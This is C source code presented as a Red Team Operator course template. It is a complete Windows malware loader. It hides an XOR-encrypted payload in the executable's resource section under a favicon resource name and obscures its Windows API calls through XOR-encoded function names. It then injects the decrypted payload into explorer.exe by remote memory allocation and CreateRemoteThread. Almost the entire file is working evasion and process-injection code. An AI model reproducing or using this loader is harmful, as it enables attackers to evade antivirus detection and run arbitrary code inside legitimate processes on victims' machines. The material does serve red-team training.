/*

 Red Team Operator course code template
 storing payload in .rsrc section
 
 author: reenz0h (twitter: @sektor7net)

*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "resources.h"
#include <tlhelp32.h>

LPVOID (WINAPI * pVirtualAllocEx)(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);

BOOL (WINAPI * pWriteProcessMemory)(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);

HANDLE (WINAPI * pCreateRemoteThread)(
  HANDLE                 hProcess,
  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  SIZE_T                 dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress,
  LPVOID                 lpParameter,
  DWORD                  dwCreationFlags,
  LPDWORD                lpThreadId
);

HANDLE (WINAPI * pCreateToolhelp32Snapshot)(
  DWORD dwFlags,
  DWORD th32ProcessID
);

FARPROC (WINAPI * pGetProcAddress)(
  HMODULE hModule,
  LPCSTR  lpProcName
);

HMODULE (WINAPI * pGetModuleHandle)(
  LPCSTR lpModuleName
);

HRSRC (WINAPI * pFindResourceA)(
  HMODULE hModule,
  LPCSTR  lpName,
  LPCSTR  lpType
);

HGLOBAL (WINAPI * pLoadResource)(
  HMODULE hModule,
  HRSRC   hResInfo
);

LPVOID (WINAPI * pLockResource)(
  HGLOBAL hResData
);

DWORD (WINAPI * pSizeofResource)(
  HMODULE hModule,
  HRSRC   hResInfo
);

LPVOID (WINAPI * pVirtualAlloc)(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);

VOID (WINAPI * pRtlMoveMemory)(
  _Out_       VOID UNALIGNED *Destination,
  _In_  const VOID UNALIGNED *Source,
  _In_        SIZE_T         Length
);

HANDLE (WINAPI * pOpenProcess)(
  DWORD dwDesiredAccess,
  BOOL  bInheritHandle,
  DWORD dwProcessId
);

BOOL (WINAPI * pProcess32First)(
  HANDLE           hSnapshot,
  LPPROCESSENTRY32 lppe
);

BOOL (WINAPI * pProcess32Next)(
  HANDLE           hSnapshot,
  LPPROCESSENTRY32 lppe
);

char key[] = "mysecretkeee";

void XOR(char * data, size_t data_len, char * key, size_t key_len) {
    int j = 0;
	
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) {
		    j = 0;
		}

	    data[i] = data[i] ^ key[j];
		j++;
	}

    data[data_len] = '\0';

    printf("DEXOR: %s\n", data);
}

int FindTarget(const char *procname) {

    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

	// XOR'd versions of each of these function names - using key stored in this code
	unsigned char sKernel32[] = { 0x6, 0x1c, 0x1, 0xb, 0x6, 0x1e, 0x56, 0x46, 0x45, 0x1, 0x9, 0x9 };
    unsigned char sCreateToolhelp32Snapshot[] = { 0x2e, 0xb, 0x16, 0x4, 0x17, 0x17, 0x31, 0x1b, 0x4, 0x9, 0xd, 0x0, 0x1, 0x9, 0x40, 0x57, 0x30, 0x1c, 0x4, 0x4, 0x18, 0xd, 0xa, 0x11 };
    unsigned char sProcess32First[] = { 0x3d, 0xb, 0x1c, 0x6, 0x6, 0x1, 0x16, 0x47, 0x59, 0x23, 0xc, 0x17, 0x1e, 0xd };
    unsigned char sProcess32Next[] = { 0x3d, 0xb, 0x1c, 0x6, 0x6, 0x1, 0x16, 0x47, 0x59, 0x2b, 0x0, 0x1d, 0x19 };

	// XOR the string with the key to get back the original name
    XOR((char *) sKernel32, sizeof(sKernel32), key, sizeof(key));
    XOR((char *) sCreateToolhelp32Snapshot, sizeof(sCreateToolhelp32Snapshot), key, sizeof(key));
	XOR((char *) sProcess32First, sizeof(sProcess32First), key, sizeof(key));
    XOR((char *) sProcess32Next, sizeof(sProcess32Next), key, sizeof(key));

	// Now we've decoded the strings, get the module and function location
	pCreateToolhelp32Snapshot = GetProcAddress(GetModuleHandle(sKernel32), sCreateToolhelp32Snapshot);
    pProcess32First = GetProcAddress(GetModuleHandle(sKernel32), sProcess32First);
    pProcess32Next = GetProcAddress(GetModuleHandle(sKernel32), sProcess32Next);
    
    // DEBUG
    printf("%d", sizeof(sKernel32));
    printf("Kernel32: %p\n", GetModuleHandle(sKernel32));
    printf("Library: %p\n", pCreateToolhelp32Snapshot);
    printf("%p\n", pProcess32First);
    printf("%p\n", pProcess32Next);

    hProcSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) {
      return 0;
    }
                
    pe32.dwSize = sizeof(PROCESSENTRY32); 
            
    if (!pProcess32First(hProcSnap, &pe32)) {
            CloseHandle(hProcSnap);
            return 0;
    }
            
    while (pProcess32Next(hProcSnap, &pe32)) {
            if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                    pid = pe32.th32ProcessID;
                    break;
            }
    }
            
    CloseHandle(hProcSnap);
            
    return pid;
}

int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

    LPVOID pRemoteCode = NULL;
    HANDLE hThread = NULL;

    // XOR'd versions of each of these function names - using key stored in this code
    unsigned char sVirtualAllocEx[] = { 0x3b, 0x10, 0x1, 0x11, 0x16, 0x13, 0x9, 0x35, 0x7, 0x9, 0xa, 0x6, 0x28, 0x1 };
    unsigned char sWriteProcessMemory[] = { 0x3a, 0xb, 0x1a, 0x11, 0x6, 0x22, 0x17, 0x1b, 0x8, 0x0, 0x16, 0x16, 0x20, 0x1c, 0x1e, 0xa, 0x11, 0xb };
    unsigned char sCreateRemoteThread[] = { 0x2e, 0xb, 0x16, 0x4, 0x17, 0x17, 0x37, 0x11, 0x6, 0xa, 0x11, 0x0, 0x39, 0x11, 0x1, 0x0, 0x2, 0x16 };
    unsigned char sKernel32[] = { 0x6, 0x1c, 0x1, 0xb, 0x6, 0x1e, 0x56, 0x46, 0x45, 0x1, 0x9, 0x9 };

    // XOR the string with the key to get back the original name	
    XOR((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx), key, sizeof(key));
    XOR((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory), key, sizeof(key));
    XOR((char *) sCreateRemoteThread, sizeof(sCreateRemoteThread), key, sizeof(key));
    XOR((char *) sKernel32, sizeof(sKernel32), key, sizeof(key));

    // Now we've decoded the strings, get the module and function location
    pVirtualAllocEx = GetProcAddress(GetModuleHandle(sKernel32), sVirtualAllocEx);
    pWriteProcessMemory = GetProcAddress(GetModuleHandle(sKernel32), sWriteProcessMemory);
    pCreateRemoteThread = GetProcAddress(GetModuleHandle(sKernel32), sCreateRemoteThread);

    printf("%p\n", pVirtualAllocEx);
    printf("%p\n", pWriteProcessMemory);
    printf("%p\n", pCreateRemoteThread);

    // allocate memory in remote process
    pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);

    // write our payload to the remote process
    pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
    
    // create a remote thread to start our payload
    hThread = pCreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
    if (hThread != NULL) {
            WaitForSingleObject(hThread, 500);
            CloseHandle(hThread);
            return 0;
    }
    return -1;
}

// Windows GUI rather than console
// int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
    // LPSTR lpCmdLine, int nCmdShow) {

int main() {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
	HGLOBAL resHandle = NULL;
	HRSRC res;
	
	unsigned char * payload;
	unsigned int payload_len;
	
	
	int pid = 0;
    HANDLE hProc = NULL;

    // XOR'd versions of each of these function names - using key stored in this code
    unsigned char sFindResourceA[] = { 0x2b, 0x10, 0x1d, 0x1, 0x31, 0x17, 0x16, 0x1b, 0x1e, 0x17, 0x6, 0x0, 0x2c };
    unsigned char sLoadResource[] = { 0x21, 0x16, 0x12, 0x1, 0x31, 0x17, 0x16, 0x1b, 0x1e, 0x17, 0x6, 0x0 };
    unsigned char sLockResource[] = { 0x21, 0x16, 0x10, 0xe, 0x31, 0x17, 0x16, 0x1b, 0x1e, 0x17, 0x6, 0x0 };
    unsigned char sSizeofResource[] = { 0x3e, 0x10, 0x9, 0x0, 0xc, 0x14, 0x37, 0x11, 0x18, 0xa, 0x10, 0x17, 0xe, 0x1c };
    unsigned char sVirtualAlloc[] = { 0x3b, 0x10, 0x1, 0x11, 0x16, 0x13, 0x9, 0x35, 0x7, 0x9, 0xa, 0x6 };
    unsigned char sRtlMoveMemory[] = { 0x3f, 0xd, 0x1f, 0x28, 0xc, 0x4, 0x0, 0x39, 0xe, 0x8, 0xa, 0x17, 0x14 };
    unsigned char sOpenProcess[] = { 0x22, 0x9, 0x16, 0xb, 0x33, 0x0, 0xa, 0x17, 0xe, 0x16, 0x16 };
    unsigned char sKernel32[] = { 0x6, 0x1c, 0x1, 0xb, 0x6, 0x1e, 0x56, 0x46, 0x45, 0x1, 0x9, 0x9 };

    // XOR the string with the key to get back the original name	
    XOR((char *) sFindResourceA, sizeof(sFindResourceA), key, sizeof(key));
    XOR((char *) sLoadResource, sizeof(sLoadResource), key, sizeof(key));
    XOR((char *) sLockResource, sizeof(sLockResource), key, sizeof(key));
    XOR((char *) sSizeofResource, sizeof(sSizeofResource), key, sizeof(key));
    XOR((char *) sVirtualAlloc, sizeof(sVirtualAlloc), key, sizeof(key));
    XOR((char *) sRtlMoveMemory, sizeof(sRtlMoveMemory), key, sizeof(key));
    XOR((char *) sOpenProcess, sizeof(sOpenProcess), key, sizeof(key));
    XOR((char *) sKernel32, sizeof(sKernel32), key, sizeof(key));

    // Now we've decoded the strings, get the module and function location
    pFindResourceA = GetProcAddress(GetModuleHandle(sKernel32), sFindResourceA);
    pLoadResource = GetProcAddress(GetModuleHandle(sKernel32), sLoadResource);
    pLockResource = GetProcAddress(GetModuleHandle(sKernel32), sLockResource);
    pSizeofResource = GetProcAddress(GetModuleHandle(sKernel32), sSizeofResource);
    pVirtualAlloc = GetProcAddress(GetModuleHandle(sKernel32), sVirtualAlloc);
    pRtlMoveMemory = GetProcAddress(GetModuleHandle(sKernel32), sRtlMoveMemory);
    pOpenProcess = GetProcAddress(GetModuleHandle(sKernel32), sOpenProcess);

	// Extract payload from resources section
	res = pFindResourceA(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	resHandle = pLoadResource(NULL, res);
	payload = (char *) pLockResource(resHandle);
	payload_len = pSizeofResource(NULL, res);
	
	// Allocate some memory buffer for payload
	exec_mem = pVirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	
	// Copy payload to new memory buffer
	pRtlMoveMemory(exec_mem, payload, payload_len);
	
	// Decrypt (DeXOR) the payload
	XOR((char *) exec_mem, payload_len, key, sizeof(key));

	// injection process starts here
	pid = FindTarget("explorer.exe");

	if (pid) {
		// try to open target process
		hProc = pOpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) {
			Inject(hProc, exec_mem, payload_len);
			CloseHandle(hProc);
		}
	}

	return 0;
}
